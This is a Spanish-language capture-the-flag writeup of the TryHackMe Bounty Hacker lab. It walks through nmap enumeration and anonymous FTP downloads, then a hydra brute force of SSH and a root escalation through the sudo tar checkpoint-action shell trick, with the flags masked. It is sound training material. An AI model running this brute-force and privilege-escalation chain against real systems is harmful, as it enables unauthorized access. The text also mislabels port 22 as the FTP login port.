---
title: TryHackMe Bounty Hacker Writeup
published: true
---

La máquina Bounty Hacker, es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos responder a las preguntas que nos plantean, así como el user.txt y el root.txt

# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar los puertos abiertos:

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
❯ nmap -p- --open --min-rate 5000 -T5 -n -vvv -Pn 10.10.40.43
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 14:34 EDT
Initiating Connect Scan at 14:34
Scanning 10.10.40.43 [65535 ports]
Discovered open port 80/tcp on 10.10.40.43
Discovered open port 21/tcp on 10.10.40.43
Discovered open port 22/tcp on 10.10.40.43
Completed Connect Scan at 14:34, 24.83s elapsed (65535 total ports)
Nmap scan report for 10.10.40.43
Host is up, received user-set (0.087s latency).
Scanned at 2023-03-23 14:34:13 EDT for 25s
Not shown: 56360 filtered tcp ports (no-response), 9172 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.87 seconds
```

El escaneo nos reporta tres puertos abiertos, el 21, el 22 y el 80, así como el servicio que corre en cada uno de ellos.

Ananalizamos la versión y servicio de estos puertos mediante nmap para sacar más información:

```bash
❯ nmap -p21,22,80 -sCV 10.10.40.43 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 14:34 EDT
Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.81% done; ETC: 14:35 (0:00:00 remaining)
Nmap scan report for 10.10.40.43
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 230
|_Login successful.
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.22 seconds
```

# []($header-1)Acceso al sistema

El puerto 22 nos reporta que podemos logearnos. Lo intentamos con el usuario anonymous y lo conseguimos.

Podemos ver los archivos y llevarnoslos a nuestro equipo:

```bash
ftp> ls
229 Entering Extended Passive Mode (|||35549|)
ftp: Can't connect to `10.10.40.43:35549': Expiró el tiempo de conexión
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |**********************************************|   418        8.52 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (3.10 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |**********************************************|    68        5.41 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.72 KiB/s)
```

El archivo task.txt nos reporta un usuario (pregunta de la room en THM). Por otro lado, el archivo locks.txt nos muestra potenciales contraseñas para ese usuario. Teniendo esto, intentaremos conectarnos por SSH (pregunta de la room de THM) con el usuario y alguna de las contraseñas proporcionadas.

```bash
❯ hydra -l lin -P /home/jorge/THM/BountyHacker/nmap/locks.txt ssh://10.10.40.43
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-23 14:52:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.40.43:22/
[22][ssh] host: 10.10.40.43   login: lin   password: ??????????????
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-23 14:52:35

```

Nos reporta una la contraseña (pregunta de la room en THM).

Nos conectamos mediante ssh:

```bash
❯ ssh lin@10.10.40.43
The authenticity of host '10.10.40.43 (10.10.40.43)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.40.43' (ED25519) to the list of known hosts.
lin@10.10.40.43's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$
```

Listamos el conteido y obtenemos user.txt

```bash
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
???????????????????
```

# []($header-1)Escalada de privilegios

Hacemos sudo -l y nos reporta que podemos ejecutar el binario /bin/tar como sudo:

```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Nos dirigimos a <a href="https://gtfobins.github.io/gtfobins/tar/"> GTFO bins </a>y ejecutamos el comando proporcionado:
 
> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

Obtenemos acceso al sistema como root. Nos dirigimos a /root y conseguimos root.txt

```bash
lin@bountyhacker:~/Desktop$     sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
#ls
root.txt
#cat root.txt
???????????????
```

Muchas gracias por leer este Writeup, espero que te haya gustado mucho!
